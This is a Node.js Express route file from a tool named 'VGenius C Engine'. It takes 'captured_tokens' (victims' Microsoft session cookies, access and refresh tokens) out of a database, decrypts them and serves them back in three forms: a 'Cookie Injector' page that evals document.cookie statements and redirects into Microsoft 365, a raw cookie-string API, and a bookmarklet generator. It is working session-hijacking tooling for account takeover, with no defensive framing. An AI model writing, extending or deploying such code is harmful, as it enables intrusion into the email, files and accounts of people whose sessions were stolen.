/**
 * VGenius C Engine - Cookie Injection Routes
 * Uses our proven method: load Microsoft page, inject cookies, redirect
 */
const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// ─── Cookie Injection Page ──────────────────────────────────────
router.get('/page/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).send('No tokens available');
    }

    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    var accountType = token.account_type || 'unknown';
    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
    } else {
      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
      }
    }

    if (cookiesList.length === 0) return res.status(400).send('No tokens available');

    res.type('html').send(generateInjectPage(cookiesList, clientId, tenant));
  } catch (err) {
    console.error('[CookieInject] Page error:', err);
    res.status(500).send('Server error');
  }
});

// ─── Direct Cookie String API ──────────────────────────────────────
router.get('/raw/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var accountType = token.account_type || 'unknown';
    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
    } else {
      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
      }
    }

    var cookieString = [];
    for (var i = 0; i < cookiesList.length; i++) {
      const c = cookiesList[i];
      cookieString.push(`document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";`);
    }

    res.json({
      success: true,
      cookie_string: cookieString.join(''),
      cookie_count: cookiesList.length,
      cookies: cookiesList
    });
  } catch (err) {
    console.error('[CookieInject] Raw error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Parse Cookie String ───────────────────────────────────────────
function parseCookies(cookieString, options) {
  if (!cookieString) return [];

  options = options || {};
  var tenant = options.tenant || 'common';
  var accountType = options.accountType || 'unknown';

  var domainMap = buildCookieDomainMap(tenant, accountType);

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower === 'samesite' || nameLower === 'partitioned') {
        continue;
      }
      if (!value || value.length === 0) continue;

      var assignedDomain = domainMap.getDomain(name);

      seenNames[nameLower] = {
        name: name,
        value: value,
        domain: assignedDomain
      };
    }
  }

  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }
  return cookies;
}

// ─── Build Cookie Domain Map ───────────────────────────────────────
function buildCookieDomainMap(tenant, accountType) {
  var domainMap = {
    _getDomain: function(cookieName) {
      var nameLower = cookieName.toLowerCase();

      if (accountType === 'personal') {
        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
          return '.login.live.com';
        }
        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
          return '.login.live.com';
        }
        if (nameLower.indexOf('wbtelemetry') !== -1 || nameLower.indexOf('_mut') !== -1) {
          return '.microsoft.com';
        }
        return '.login.live.com';
      }

      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
          nameLower === 'es' || nameLower === 'pplms' || nameLower === 'x-ms-gw-svc') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }

      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen' ||
          nameLower === 'cpl' || nameLower === 'BGCookiesDeletedFlag') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }

      if (nameLower.indexOf('msoft') !== -1 || nameLower.indexOf('msauth') !== -1 ||
          nameLower.indexOf('rt') !== -1 || nameLower === 'fpc' ||
          nameLower.indexOf('x-ms') !== -1) {
        return '.login.microsoftonline.com';
      }

      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
          nameLower === 'MCLRC' || nameLower === 'MSSC' || nameLower === 'SS' ||
          nameLower === 'RUPDT' || nameLower === 'wssbLocation' ||
          nameLower === 'wssbCorrelationId' || nameLower === 'wssbSsoBcKey') {
        return '.office.com';
      }

      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
          nameLower === 'RL' || nameLower === 'X_MS_TID' ||
          nameLower.indexOf('onedrive') !== -1 || nameLower.indexOf('skydrive') !== -1) {
        return '.onedrive.live.com';
      }

      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
          nameLower === 'arch' || nameLower === 'CkTkt' ||
          nameLower.indexOf('outlook') !== -1 || nameLower === 'X-MS-TRANSITION') {
        return '.outlook.office365.com';
      }

      if (nameLower === 'SPOIDCRL' || nameLower === 'Esx' ||
          nameLower === 'SPOExtensionSDK' || nameLower.indexOf('sposrs') !== -1 ||
          nameLower.indexOf('sharepoint') !== -1) {
        return '.sharepoint.com';
      }

      if (nameLower === 'TEAMSSESSION' || nameLower === 'MSFT' ||
          nameLower.indexOf('teams') !== -1 || nameLower === 'TSTC') {
        return '.teams.microsoft.com';
      }

      if (nameLower === 'fpc' || nameLower === 'bms' ||
          nameLower === 'BMC' || nameLower === 'MSF' ||
          nameLower === 'MSFPC' || nameLower === 'WAFF' ||
          nameLower === 'ANON' || nameLower === '_ana' ||
          nameLower === '_gat' || nameLower === '_gid') {
        return '.microsoft.com';
      }

      if (nameLower === 'Loginportal' || nameLower === 'AADBRS' ||
          nameLower === 'AADBPA' || nameLower === 'STSSSSID' ||
          nameLower.indexOf('lobsrc') !== -1) {
        return '.login.microsoftonline.com';
      }

      if (accountType === 'personal') {
        return '.login.live.com';
      }
      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
    },
    getDomain: function(cookieName) {
      return this._getDomain(cookieName);
    }
  };

  return domainMap;
}

// ─── Generate Cookie Injection Page ────────────────────────────────
function generateInjectPage(cookies, clientId, tenant) {
  // Store as parallel arrays for safe JavaScript embedding
  var cookieData = {
    names: [],
    values: [],
    domains: []
  };
  for (var i = 0; i < cookies.length; i++) {
    cookieData.names.push(cookies[i].name);
    cookieData.values.push(cookies[i].value);
    cookieData.domains.push(cookies[i].domain || '');
  }
  
  // Base64 encode the cookie data to prevent any special character issues
  var cookieDataJson = JSON.stringify(cookieData);
  var cookieDataB64 = Buffer.from(cookieDataJson).toString('base64');

  var baseDomain = tenant && tenant !== 'common' ? '.' + tenant + '.login.microsoftonline.com' : '.login.microsoftonline.com';

  // Build auth URL - use https://www.office.com/ as redirect_uri since it's commonly registered
  var authUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=' + clientId + '&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&scope=openid+profile+email+offline_access';
  var navTargets = [
    authUrl,
    'https://login.microsoftonline.com/',
    'https://www.office.com/'
  ];

  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
  html += '  <meta charset="UTF-8">\n';
  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
  html += '  <title>VGenius Cookie Injector</title>\n';
  html += '  <style>\n';
  html += '    * { margin: 0; padding: 0; box-sizing: border-box; }\n';
  html += '    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; max-width: 900px; margin: 0 auto; background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%); color: #e0e0e0; min-height: 100vh; }\n';
  html += '    h1 { color: #00ccff; margin-bottom: 20px; font-size: 24px; }\n';
  html += '    .info-box { background: rgba(0, 204, 255, 0.1); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 8px; padding: 16px; margin-bottom: 20px; }\n';
  html += '    .info-box p { margin: 4px 0; font-size: 14px; }\n';
  html += '    .info-box strong { color: #00ccff; }\n';
  html += '    button { padding: 14px 28px; cursor: pointer; background: linear-gradient(135deg, #00ccff, #0099cc); color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; margin: 8px 5px; transition: all 0.2s; }\n';
  html += '    button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0, 204, 255, 0.3); }\n';
  html += '    button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }\n';
  html += '    .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }\n';
  html += '    .btn-secondary:hover { background: linear-gradient(135deg, #777, #555); }\n';
  html += '    .status { margin-top: 20px; padding: 14px; border-radius: 8px; font-family: "Courier New", monospace; font-size: 13px; line-height: 1.6; }\n';
  html += '    .info { background: rgba(0, 150, 255, 0.1); border: 1px solid rgba(0, 150, 255, 0.3); color: #4db8ff; }\n';
  html += '    .success { background: rgba(0, 255, 100, 0.1); color: #0f0; border: 1px solid rgba(0, 255, 100, 0.3); }\n';
  html += '    .error { background: rgba(255, 50, 50, 0.1); color: #ff4444; border: 1px solid rgba(255, 50, 50, 0.3); }\n';
  html += '    .progress { background: rgba(255, 200, 0, 0.1); color: #ffcc00; border: 1px solid rgba(255, 200, 0, 0.3); }\n';
  html += '    .cookie-list { max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px; margin: 10px 0; font-size: 12px; }\n';
  html += '    .cookie-item { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }\n';
  html += '    .actions { margin-top: 15px; }\n';
  html += '  </style>\n';
  html += '</head>\n<body>\n';
  html += '  <h1>\ud83d\udd11 VGenius Cookie Injector</h1>\n';
  html += '  <div class="info-box">\n';
  html += '    <p><strong>Cookies Ready:</strong> <span id="cookieCount">' + cookies.length + '</span></p>\n';
  html += '    <p><strong>Target:</strong> Microsoft 365 / Azure AD</p>\n';
  html += '    <p><strong>Instructions:</strong> Click a button below to inject cookies and login.</p>\n';
  html += '  </div>\n';
  html += '  <div class="cookie-list" id="cookieList"></div>\n';
  html += '  <div class="actions">\n';
  html += '    <button onclick="startInjection()" id="injectBtn">\ud83d\ude80 Inject Cookies & Login</button>\n';
  html += '    <button onclick="copyCookies()" class="btn-secondary">\ud83d\udccb Copy Cookie String</button>\n';
  html += '    <button onclick="openDirect()" class="btn-secondary">\ud83d\udd17 Open Microsoft Directly</button>\n';
  html += '  </div>\n';
  html += '  <div id="status"></div>\n';
  html += '  <script>\n';
  // FIX: Use base64 encoding to safely embed cookie data with special characters
  html += '    var cookieDataB64 = "' + cookieDataB64 + '";\n';
  html += '    var cookieData = JSON.parse(atob(cookieDataB64));\n';
  html += '    var cookieNames = cookieData.names;\n';
  html += '    var cookieValues = cookieData.values;\n';
  html += '    var cookieDomains = cookieData.domains;\n';
  html += '    var targetUrl = "' + navTargets[0].replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/'/g, "\\'") + '";\n';
  html += '    var baseDomain = "' + baseDomain + '";\n';
  html += '\n';
  html += '    // Display cookie list\n';
  html += '    (function displayCookies() {\n';
  html += '      var list = document.getElementById("cookieList");\n';
  html += '      var listHtml = "";\n';
  html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
  html += '        var shortVal = cookieValues[i].length > 30 ? cookieValues[i].substring(0, 30) + "..." : cookieValues[i];\n';
  html += '        listHtml += "<div class=\\"cookie-item\\"><strong>" + cookieNames[i] + "</strong> = " + shortVal + "...</div>\\n";\n';
  html += '      }\n';
  html += '      list.innerHTML = listHtml;\n';
  html += '    })();\n';
  html += '\n';
  html += '    // Build cookie injection statements safely\n';
  html += '    function buildCookieScript() {\n';
  html += '      var script = "";\n';
  html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
  html += '        var domain = cookieDomains[i] || baseDomain;\n';
  html += '        var encodedValue = encodeURIComponent(cookieValues[i]);\n';
  html += '        script += \'document.cookie = "\' + cookieNames[i] + "=" + encodedValue + \'; domain=\' + domain + \'; path=/; Secure; SameSite=None\\";\\n\';\n';
  html += '      }\n';
  html += '      return script;\n';
  html += '    }\n';
  html += '\n';
  html += '    // Build full cookie string for copying\n';
  html += '    function buildCookieString() {\n';
  html += '      var parts = [];\n';
  html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
  html += '        parts.push(cookieNames[i] + "=" + cookieValues[i]);\n';
  html += '      }\n';
  html += '      return parts.join("; ");\n';
  html += '    }\n';
  html += '\n';
  html += '    function setStatus(msg, type) {\n';
  html += '      var el = document.getElementById("status");\n';
  html += '      el.className = "status " + type;\n';
  html += '      el.innerHTML = msg;\n';
  html += '    }\n';
  html += '\n';
  html += '    function startInjection() {\n';
  html += '      var btn = document.getElementById("injectBtn");\n';
  html += '      btn.disabled = true;\n';
  html += '      setStatus("Injecting cookies...", "progress");\n';
  html += '      var script = buildCookieScript();\n';
  html += '      eval(script);\n';
  html += '      setStatus("Cookies injected! Navigating to Microsoft...", "progress");\n';
  html += '      setTimeout(function() {\n';
  html += '        setStatus("Redirecting...", "info");\n';
  html += '        window.location.href = targetUrl;\n';
  html += '      }, 500);\n';
  html += '    }\n';
  html += '\n';
  html += '    function copyCookies() {\n';
  html += '      var cookieStr = buildCookieString();\n';
  html += '      if (navigator.clipboard && navigator.clipboard.writeText) {\n';
  html += '        navigator.clipboard.writeText(cookieStr).then(function() {\n';
  html += '          setStatus("Copied " + cookieNames.length + " cookies to clipboard!", "success");\n';
  html += '        }).catch(function() {\n';
  html += '          fallbackCopy(cookieStr);\n';
  html += '        });\n';
  html += '      } else {\n';
  html += '        fallbackCopy(cookieStr);\n';
  html += '      }\n';
  html += '    }\n';
  html += '\n';
  html += '    function fallbackCopy(text) {\n';
  html += '      var ta = document.createElement("textarea");\n';
  html += '      ta.value = text;\n';
  html += '      ta.style.position = "fixed";\n';
  html += '      ta.style.opacity = "0";\n';
  html += '      document.body.appendChild(ta);\n';
  html += '      ta.select();\n';
  html += '      document.execCommand("copy");\n';
  html += '      document.body.removeChild(ta);\n';
  html += '      setStatus("Copied " + cookieNames.length + " cookies to clipboard!", "success");\n';
  html += '    }\n';
  html += '\n';
  html += '    function openDirect() {\n';
  html += '      window.location.href = targetUrl;\n';
  html += '    }\n';
  html += '  </script>\n';
  html += '</body>\n</html>';

  return html;
}

// ─── Bookmarklet Generator ─────────────────────────────────────────
router.get('/bookmarklet/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    var accountType = token.account_type || 'unknown';
    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
    } else {
      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
      }
    }

    if (cookiesList.length === 0) return res.status(400).json({ error: 'No cookies available' });

    var bookmarklet = '';
    for (var i = 0; i < cookiesList.length; i++) {
      const c = cookiesList[i];
      bookmarklet += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
    }
    bookmarklet += '\n';
    bookmarklet += '// Redirect after 3s\n';
    bookmarklet += 'setTimeout(() => {\n';
    bookmarklet += '  window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
    bookmarklet += '}, 3000);\n';

    res.json({ bookmarklet: bookmarklet, cookies: cookiesList });
  } catch (err) {
    console.error('[CookieInject] Bookmarklet error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
